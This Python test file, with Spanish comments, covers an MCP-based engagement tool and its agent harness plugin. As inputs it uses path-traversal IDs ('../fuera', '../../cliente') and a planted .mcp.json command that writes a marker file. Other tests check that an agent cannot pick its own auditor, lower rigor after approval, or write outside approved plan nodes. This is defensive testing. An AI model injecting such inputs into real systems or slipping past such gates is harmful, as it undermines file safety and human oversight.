    assert global_cfg["cuenta"] == {"id": 1} and set(global_cfg["mcpServers"]) == {"previo", "m37-kernel"}

    # Un JSON roto no se pisa: se detiene y no modifica nada
    broken = tmp_path / "broken"
    broken.mkdir()
    (broken / ".mcp.json").write_text("{ esto no es json", encoding="utf-8")
    with pytest.raises(HarnessInstallError, match="no es JSON válido"):
        install_harness_plugin(target="claude", scope="workspace", workspace_dir=broken, home_dir=home)
    assert (broken / ".mcp.json").read_text(encoding="utf-8") == "{ esto no es json"


def test_na3_python_command_is_the_interpreter_that_has_m37_installed() -> None:
    cmd = _resolve_python_command()
    assert cmd == Path(sys.executable).absolute().as_posix()
    probe = subprocess.run([cmd, "-c", "import m37.mcp_server"], capture_output=True, text=True, timeout=120, check=False)
    assert probe.returncode == 0, probe.stderr[-400:]
    assert _resolve_python_command(portable=True) == "python"


# ----------------------------------------------------------------------------------------------------------------------
# M6 / B1 / B2 / NM2 / NM3 — higiene
# ----------------------------------------------------------------------------------------------------------------------
def test_m6_workspace_inside_a_git_tracked_engine_checkout_is_refused(tmp_path: Path) -> None:
    repo = tmp_path / "motor"
    repo.mkdir()
    if subprocess.run(["git", "init", "-q", str(repo)], capture_output=True, check=False).returncode != 0:
        pytest.skip("git no disponible")
    (repo / ".gitignore").write_text("workspaces/\n", encoding="utf-8")
    with pytest.raises(GitLeakSafetyError, match="no está ignorada"):
        check_git_leak_safety(repo / "mi_ws", repo)
    with pytest.raises(GitLeakSafetyError):
        check_git_leak_safety(repo, repo)
    assert check_git_leak_safety(repo / "workspaces" / "demo", repo)[0] is False  # dentro, pero ignorado por git
    assert check_git_leak_safety(tmp_path / "fuera", repo)[0] is True


def test_b1_b2_stale_locks_recover_and_ids_are_validated(tmp_path: Path) -> None:
    paths = init_workspace(tmp_path / "ws")
    lock = paths.workspace_root / ".m37_locks" / f"H-{DEMO}.lock"
    lock.parent.mkdir(parents=True, exist_ok=True)
    lock.write_text("", encoding="utf-8")
    old = time.time() - 3600
    os.utime(lock, (old, old))
    assert allocate_next_id(paths, "H", engagement_id=DEMO).startswith(f"H-{DEMO}-")

    for bad in ("../fuera", "con espacio", "a/b", "", "x" * 200):
        with pytest.raises(ValueError, match="inválido"):
            create_new_engagement(paths, bad, "CLI")
    with pytest.raises(ValueError, match="inválido"):
        create_new_engagement(paths, "ENC-OK", "../../cliente")


def test_nm2_nm3_mcp_server_is_pinned_to_its_workspace_and_survives_bad_input(tmp_path: Path) -> None:
    init_workspace(tmp_path / "ws")
    resp = handle_jsonrpc_request(
        {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {"name": "m37_workspace_status", "arguments": {"vault": str(tmp_path / "otro_ws")}},
        },
        vault=str(tmp_path / "ws"),
    )
    assert resp is not None and resp["result"]["isError"] is True
    assert "fijado a un workspace" in resp["result"]["content"][0]["text"]

    proc = subprocess.run(
        [sys.executable, "-m", "m37.mcp_server"],
        input='esto no es json\n[1,2]\n{"jsonrpc":"2.0","id":7,"method":"ping"}\n',
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )
    lines = [json.loads(line) for line in proc.stdout.splitlines() if line.strip()]
    assert [line.get("error", {}).get("code") for line in lines[:2]] == [-32700, -32600]
    assert lines[2] == {"jsonrpc": "2.0", "id": 7, "result": {}}


# ----------------------------------------------------------------------------------------------------------------------
# Segunda ronda de la re-auditoría
# ----------------------------------------------------------------------------------------------------------------------
def test_a2_unit_aware_anchoring_and_calendar_years(tmp_path: Path) -> None:
    # DEMO-01 cita "12%" (WACC) en el Brief: eso no ancla "USD 12M" ni "12 meses"
    for prose in ("El ahorro adicional será de USD 12M.", "El retorno llegará en 12 meses."):
        with pytest.raises(CompilerAbortError) as exc:
            _compile_demo_with(tmp_path / prose[:12].replace(" ", "_"), f"{prose} {SUSTENTO}")
        assert exc.value.pass_number == 3
    html_text = _compile_demo_with(
        tmp_path / "ok", f"A noviembre de 2026 la tasa de descuento usada fue 12% y el horizonte 36 meses. {SUSTENTO}"
    )
    assert "noviembre de 2026" in html_text


def test_gate_1_is_required_at_compile_so_rigor_cannot_be_lowered_after_approval(tmp_path: Path) -> None:
    from m37.cli import verify_engagement

    paths = init_workspace(tmp_path / "ws")
    brief = paths.engagement_dir(DEMO) / "00_Brief.md"
    b_meta, b_body = parse_raw_artifact(brief.read_text(encoding="utf-8"), suffix=".md")
    b_meta["nivel_rigor"] = "L1"  # con L1 el compilador no exigiría QA ni anclaje de cifras
    b_meta["dominios_bloqueantes"] = []
    brief.write_text(dump_markdown_note(b_meta, b_body), encoding="utf-8")
    with pytest.raises(CompilerAbortError, match="Puerta 1 invalidada") as exc:
        compile_deliverable(paths, DEMO)
    assert exc.value.pass_number == 1
    report = verify_engagement(paths, DEMO)
    assert report["passed"] is False and report["puerta_1"]["vigente"] is False


def test_nc3_the_agent_cannot_choose_the_auditor_family_through_mcp() -> None:
    from m37.mcp_server import MCP_TOOL_CATALOG

    schema = next(t for t in MCP_TOOL_CATALOG if t["name"] == "m37_run_kernel_qa")["inputSchema"]["properties"]
    assert set(schema) == {"id_encargo", "id_hallazgo", "presupuesto_usd", "vault"}
    resp = handle_jsonrpc_request(
        {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {"name": "m37_run_kernel_qa", "arguments": {"id_encargo": "X", "id_hallazgo": "H", "familia_autor": "google"}},
        }
    )
    assert resp is not None and resp["result"]["isError"] is True
    assert "familia_autor" in resp["result"]["content"][0]["text"]


def test_na1_only_nodes_listed_in_the_approved_plan_carry_a_profile(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    paths, enc, _ = _engagement_with_finding(tmp_path)
    monkeypatch.delenv("M37_VAULT", raising=False)
    enc_dir = paths.engagement_dir(enc)
    # Un nodo dejado en disco fuera del plan (p. ej. con herramientas nativas) no está cubierto por Puerta 2
    rogue = (enc_dir / "Nodos" / "N-02.md").read_text(encoding="utf-8")
    rogue = rogue.replace("id: N-02", "id: N-99").replace("requiere_computo: false", "requiere_computo: true")
    (enc_dir / "Nodos" / "N-99.md").write_text(rogue, encoding="utf-8")
    assert evaluate_gate_2(enc_dir)[0] is True
    resp = handle_jsonrpc_request(
        {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "m37_write_artifact",
                "arguments": {"id_encargo": enc, "node_id": "N-99", "action": "write_script", "path": "x.py", "content": "print(1)\n"},
            },
        },
        vault=str(paths.workspace_root),
    )
    assert resp is not None and resp["result"]["isError"] is True
    assert "no corresponde a ningún nodo" in resp["result"]["content"][0]["text"]


def test_plugin_status_never_executes_an_unknown_command_from_a_project_config(tmp_path: Path) -> None:
    from m37.harness import probe_configured_mcp

    marker = tmp_path / "ejecutado.txt"
    evil = {"mcpServers": {"m37-kernel": {"command": sys.executable, "args": ["-c", f"open(r'{marker}', 'w').write('x')"]}}}
    (tmp_path / ".mcp.json").write_text(json.dumps(evil), encoding="utf-8")
    assert probe_configured_mcp(tmp_path / ".mcp.json") is None and not marker.exists()

    good = tmp_path / "ok"
    good.mkdir()
    install_harness_plugin(target="claude", scope="workspace", workspace_dir=good, home_dir=tmp_path / "home")
    assert probe_configured_mcp(good / ".mcp.json") is True
